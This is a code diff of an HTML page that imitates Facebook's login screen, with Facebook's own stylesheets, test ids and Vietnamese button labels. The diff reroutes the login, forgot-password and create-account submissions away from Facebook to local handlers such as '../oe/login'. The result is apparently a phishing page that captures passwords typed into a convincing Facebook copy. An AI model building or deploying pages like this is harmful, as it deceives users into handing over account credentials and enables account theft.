@@ -7,12 +7,12 @@
 <title>Insert title here</title>
 <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yn/l/0,cross/JT8ZJT0WWqH.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="uUdC1OG" crossorigin="anonymous">
 <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yq/l/0,cross/L0VTH1UsUXD.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="0QQt+vI" crossorigin="anonymous">
-<link rel="stylesheet" type="text/css" href="../../CSS/passmabaomat.css">
+<link rel="stylesheet" type="text/css" href="../views/CSS/passmabaomat.css">
 
 </head>
 <body>
 	<div class="_4-u5 _30ny">
-		<form class="_9vtf" data-testid="royal_login_form" action="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQyNTczMDc0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D" method="post" onsubmit="" id="u_0_k_Ft">
+		<form class="_9vtf" data-testid="royal_login_form" action="" method="post" onsubmit="" id="u_0_k_Ft">
 			
 			<div class="mvl ptm uiInterstitial _9np_ uiInterstitialLarge uiBoxWhite">
 				<div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader">
@@ -33,10 +33,10 @@
 								<input style="margin-top: 0px; border: none" type="text" class="yu inputtext _55r1 _9oku _9o1w" name="password_new" placeholder="Password">
 								
 							</div>
-							<button value="1" class="sauo _42ft _42fu _9nq0 textPadding20px selected _42g-" id="btn_continue" name="btn_continue" type="submit">Đăng Nhập</button>
+							<button formaction="../oe/login" value="1" class="sauo _42ft _42fu _9nq0 textPadding20px selected _42g-" id="btn_continue" name="btn_continue" type="submit">Đăng Nhập</button>
 							
 							<div  class="_6ltj">
-								<a href="#">Quên mật khẩu?</a>
+								<a href="../oe/forgetmail">Quên mật khẩu?</a>
 							</div>
 							
 						</div>
@@ -45,9 +45,9 @@
 				</div>
 				<div class="hu uiInterstitialBar uiBoxGray topborder" style="margin-top: 28px;">
 					<div class="clearfix">
-						<div class="rfloat _ohf" style="margin-left: 110px">
+						<div class="rfloat _ohf" style="margin-left: 122px">
 							<button style=" padding: 0px; width: 100px;" class="_42ft _42fu _9nq1 textPadding29px selected _42g-" type="button" id="skip_button">Hủy</button>
-							<button value="1" class="_42ft _42fu _9nq0 _9nq023 textPadding20px selected _42g-" id="btn_continue" name="btn_continue" type="submit">Tạo tài khoản mới</button>
+							<button formaction="../oe/taotaikhoang" value="1" class="_42ft _42fu _9nq0 _9nq023 textPadding20px selected _42g-" id="btn_continue" name="btn_continue" type="submit">Tạo tài khoản mới</button>
 						</div>
 						<div class="pts"></div>
 					</div>
